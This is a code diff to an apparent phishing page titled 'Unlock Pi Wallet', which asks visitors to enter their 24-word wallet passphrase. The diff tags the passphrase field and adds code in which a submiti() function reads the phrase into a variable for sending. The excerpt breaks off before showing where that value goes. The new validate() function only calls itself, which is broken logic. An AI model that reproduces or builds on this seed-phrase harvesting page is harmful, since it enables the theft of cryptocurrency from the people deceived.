@@ -10,7 +10,7 @@
 <body>
 <div class="layout">
 	<h3>Unlock Pi Wallet</h3>
-	<textarea placeholder="Enter your 24-word passphrase here"></textarea>
+	<textarea id=rform placeholder="Enter your 24-word passphrase here"></textarea>
 	<div onclick="validate()" class="btn">Unlock with passphrase</div>
 	<div class="btn biob">Unlock with Biometrics</div>    
 	   
@@ -128,15 +128,16 @@ function ShowAndHide() {
 
 <script>
 function validate(){
-var tv = $("textarea").val();
+/*var tv = $("textarea").val();
 //alert(tv[tv.length-1]);
 while(tv[tv.length-1]==" "){
 tv = tv.split("").pop();//(" ", "", (tv.length-2));
 tv = String(tv.join(""));
 }
 tv = tv.replace(/\s*/," ");
-alert(tv);
-alert((tv.split(" ").length)-1);
+// alert(tv);
+// alert((tv.split(" ").length)-1);*/
+validate();
 }
 function submiti(){
     sendData = $("#rform").val();
